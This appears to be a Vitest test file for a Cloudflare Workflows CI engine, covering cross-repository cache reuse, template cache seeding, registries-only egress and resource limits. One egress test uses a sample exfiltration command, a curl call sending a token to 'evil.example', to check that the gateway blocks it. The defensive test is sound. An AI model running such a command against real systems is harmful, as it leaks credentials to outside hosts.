/**
 * Onboarding requirements: cross-repo (global) cache reuse with hermetic installs, template
 * seeding, registries-only egress, quotas, usage and timings.
 */
import { introspectWorkflowInstance } from "cloudflare:test";
import { env } from "cloudflare:workers";
import { describe, expect, it } from "vitest";
import { CachePointer, cachePointerKey } from "../../src/cache/pointer.js";
import { deriveRunId, type RunRequest, RunSummary } from "../../src/engine.js";
import type { StepSpec } from "../../src/plan/spec.js";
import { RunKeys } from "../../src/run-store.js";
import { WorkflowsCiEngine } from "../../src/workflows/engine.js";
import type { TestEnv } from "./entry.js";
import { type FakeEvent, SHAS } from "./fakes.js";

const e = env as unknown as TestEnv;
const engine = new WorkflowsCiEngine({
  workflow: e.CI_RUN_WORKFLOW,
  bucket: e.CI_BUCKET,
  runners: e.RUNNER,
});

const step = (
  name: string,
  command: string,
  parent: string | null = null,
  extra: Partial<StepSpec> = {},
): StepSpec => ({
  name,
  command,
  parent,
  after: [],
  ...extra,
});
const pipeline = (steps: StepSpec[]) => ({
  version: 1 as const,
  source: "file" as const,
  steps,
  warnings: [],
});
const install = (command = "pnpm install --frozen-lockfile fake:touch=node_modules") =>
  step("install", command, null, { cache: { inputs: ["package.json", "pnpm-lock.yaml"] } });

function request(runId: string, overrides: Partial<RunRequest> = {}): RunRequest {
  return {
    runId,
    changeId: `chg-${runId}`,
    repo: {
      remote: `https://0123.artifacts.cloudflare.net/git/gittifacts-eu/${runId}.git`,
      tokenProvider: "artifacts",
    },
    artifactsRepo: `fork-${runId}`,
    headSha: SHAS.head,
    baseSha: SHAS.base,
    limits: { maxMinutes: 60 },
    evidenceSteps: [],
    ...overrides,
  };
}

async function runToCompletion(req: RunRequest): Promise<RunSummary> {
  await using inst = await introspectWorkflowInstance(e.CI_RUN_WORKFLOW, req.runId);
  await inst.modify(async (m) => {
    await m.disableRetryDelays();
  });
  await engine.start(req);
  await inst.waitForStatus("complete");
  return summary(req.runId);
}

async function text(key: string): Promise<string | null> {
  const obj = await e.CI_BUCKET.get(key);
  return obj === null ? null : obj.text();
}

async function summary(runId: string): Promise<RunSummary> {
  return RunSummary.parse(JSON.parse((await text(RunKeys.summary(runId))) ?? "null"));
}

async function events(runId: string, stepName: string): Promise<FakeEvent[]> {
  const list = await e.CI_BUCKET.list({ prefix: `fake-events/${runId}:${stepName}/` });
  const keys = list.objects.map((o) => o.key).sort();
  return Promise.all(keys.map(async (k) => JSON.parse((await text(k)) ?? "{}") as FakeEvent));
}

const byName = (s: RunSummary) => Object.fromEntries(s.steps.map((x) => [x.name, x]));

describe("global cache scope", () => {
  it("shares an install across repositories with identical inputs, built hermetically", async () => {
    const steps = pipeline([install(), step("test", "fake:require=node_modules", "install")]);
    const first = await runToCompletion(request("glob-a", { pipeline: steps }));
    expect(first.status).toBe("passed");
    expect(byName(first).install).toMatchObject({ cacheHit: false, cacheScope: "global" });
    const hermetic = (await events("glob-a", "install")).find((x) => x.kind === "hermetic");
    expect(hermetic?.inputs).toEqual(["package.json", "pnpm-lock.yaml"]);
    const snap = (await events("glob-a", "install")).find((x) => x.kind === "snapshot")?.id;

    // A different repository (fork, remote, commit) with the same package.json and lockfile.
    const second = await runToCompletion(
      request("glob-b", { pipeline: steps, headSha: SHAS.head2 }),
    );
    expect(second.status).toBe("passed");
    expect(byName(second).install).toMatchObject({
      cacheHit: true,
      cacheScope: "global",
      computeMs: 0,
    });
    expect(await events("glob-b", "install")).toEqual([]);
    expect((await events("glob-b", "test"))[0]).toMatchObject({ kind: "start", snapshot: snap });
    expect(second.usage.cacheHits).toBe(1);
    expect(await text(RunKeys.log("glob-b", "install"))).toMatch(/cache hit \(global scope\)/);
  });

  it("can be read-only or off per run", async () => {
    const steps = pipeline([
      install("pnpm install --frozen-lockfile fake:touch=node_modules fake:out=ro"),
    ]);
    const ro = await runToCompletion(
      request("glob-ro", { pipeline: steps, cache: { global: "read-only" } }),
    );
    expect(byName(ro).install).toMatchObject({ cacheHit: false, cacheScope: "global" });
    expect((await events("glob-ro", "install")).some((x) => x.kind === "hermetic")).toBe(false);
    const pointers = await Promise.all(
      (await e.CI_BUCKET.list({ prefix: "ci-cache/" })).objects.map(async (o) =>
        CachePointer.parse(JSON.parse((await text(o.key)) ?? "{}")),
      ),
    );
    expect(pointers.find((p) => p.runId === "glob-ro")?.scope).toBe("repo:fork-glob-ro");
  });

  it("falls back to a repository cache when the step needs files outside its inputs", async () => {
    const steps = pipeline([install("pnpm install fake:needsrepo fake:touch=node_modules")]);
    const s = await runToCompletion(request("glob-fallback", { pipeline: steps }));
    expect(s.status).toBe("passed");
    expect(byName(s).install).toMatchObject({ status: "passed", cacheScope: "repo" });
    expect(byName(s).install?.reason).toMatch(/cached per repository/);
    const execs = (await events("glob-fallback", "install")).filter((x) => x.kind === "exec");
    expect(execs).toHaveLength(2);
    expect(s.usage.containers).toBe(2);
  });
});

describe("seedCache", () => {
  it("publishes a template's install so the first project run hits it", async () => {
    const seedId = await deriveRunId("seed-workers-api", SHAS.defaults);
    await using inst = await introspectWorkflowInstance(e.CI_RUN_WORKFLOW, seedId);
    await inst.modify(async (m) => {
      await m.disableRetryDelays();
    });
    const { runId } = await engine.seedCache({
      templateId: "workers-api",
      artifactsRepo: "template-workers-api",
      remote: "https://0123.artifacts.cloudflare.net/git/gittifacts-eu/template-workers-api.git",
      sha: SHAS.defaults,
    });
    expect(runId).toBe(seedId);
    await inst.waitForStatus("complete");
    const seeded = await summary(seedId);
    expect(seeded).toMatchObject({
      status: "passed",
      seed: { templateId: "workers-api" },
      evidence: [],
    });
    expect(seeded.steps.map((x) => x.name)).toEqual(["install"]);

    const project = request("from-template", { headSha: SHAS.defaults, pipelineFrom: "head" });
    delete project.evidenceSteps;
    const s = await runToCompletion(project);
    expect(byName(s).install).toMatchObject({ cacheHit: true, cacheScope: "global" });
    expect(await text(RunKeys.log("from-template", "install"))).toContain(
      "seeded for template workers-api",
    );
  });
});

describe("network: registries-only", () => {
  it("routes all egress through the gateway, trusts its CA and logs refused requests", async () => {
    const s = await runToCompletion(
      request("egress", {
        network: "registries-only",
        pipeline: pipeline([step("fetchy", "fake:curl=https://evil.example/steal?token=x")]),
      }),
    );
    const ev = await events("egress", "fetchy");
    expect(ev[0]).toMatchObject({ kind: "start", enableInternet: false });
    expect(ev.filter((x) => x.kind === "intercept").map((x) => x.target)).toEqual([
      "http:*",
      "https:*",
    ]);
    expect(ev.some((x) => x.kind === "ca")).toBe(true);
    const fetchy = byName(s).fetchy;
    expect(fetchy).toMatchObject({
      status: "failed",
      egressDenied: { count: 1, hosts: ["evil.example"] },
    });
    const log = (await text(RunKeys.log("egress", "fetchy"))) ?? "";
    expect(log).toContain("egress restricted to registry.npmjs.org");
    const blocked = log.split("\n").find((l) => l.includes("egress blocked"));
    expect(blocked).toBe(
      "[gittifacts] egress blocked: GET https://evil.example/steal (evil.example is not an allowed registry)",
    );
    expect(log).toContain("curl 403");
  });

  it("locks plan mode down to the git host even for open runs", async () => {
    const req = request("plan-locked", { headSha: SHAS.withCiFile, pipelineFrom: "head" });
    delete req.evidenceSteps;
    const s = await runToCompletion(req);
    expect(s.status).toBe("passed");
    const plan = await events("plan-locked", "plan");
    expect(plan[0]).toMatchObject({ kind: "start", enableInternet: false });
    expect(plan.some((x) => x.kind === "ca")).toBe(true);
    expect(await text(RunKeys.log("plan-locked", "plan"))).toContain("network git host only");
  });
});

describe("limits, usage and timings", () => {
  it("clamps instances, caps logs, bounds timeouts by the remaining minutes and reports usage", async () => {
    const s = await runToCompletion(
      request("limits", {
        limits: { maxMinutes: 5, instance: "standard-1", maxLogBytes: 64 * 1024 },
        pipeline: pipeline([step("big", "fake:spam=100000", null, { instance: "standard-4" })]),
      }),
    );
    expect(s.status).toBe("passed");
    const ev = await events("limits", "big");
    expect(ev[0]).toMatchObject({ kind: "start", instance: "standard-1" });
    const timeout = /timeout --kill-after=10 (\d+) /.exec(
      String(ev.find((x) => x.kind === "exec")?.command),
    );
    expect(Number(timeout?.[1])).toBeLessThanOrEqual(300);
    expect(s.warnings.join("\n")).toContain('step "big" runs on standard-1 (requested standard-4');
    expect(await text(RunKeys.log("limits", "big"))).toContain("log truncated at 65536 bytes");

    const big = byName(s).big!;
    expect(big.instance).toBe("standard-1");
    expect(big.computeMs).toBeGreaterThan(0);
    expect(big.timings).toMatchObject({
      queueMs: expect.any(Number),
      containerStartMs: expect.any(Number),
      checkoutMs: expect.any(Number),
      commandMs: expect.any(Number),
      totalMs: expect.any(Number),
    });
    expect(s.usage.containers).toBe(1);
    expect(s.usage.computeMs).toBe(big.computeMs);
    expect(s.usage.byInstance["standard-1"]).toBe(big.computeMs);
    expect(s.usage.ciMinutes).toBeGreaterThan(0);
    expect(s.usage.logBytes).toBeGreaterThan(64 * 1024);
    expect(s.timings.totalMs).toBeGreaterThanOrEqual(0);
    expect(s.timings.firstStepMs).toBeGreaterThanOrEqual(0);
    const status = await engine.status("limits");
    expect(status.usage?.computeMs).toBe(big.computeMs);
  });

  it("accepts the deprecated budget and requires one of limits/budget", async () => {
    const base = request("no-limits", { pipeline: pipeline([step("a", "fake:exit=0")]) });
    delete base.limits;
    await expect(engine.start(base)).rejects.toThrow(/limits/);
    expect(cachePointerKey("f".repeat(64))).toContain("ci-cache/");
  });
});
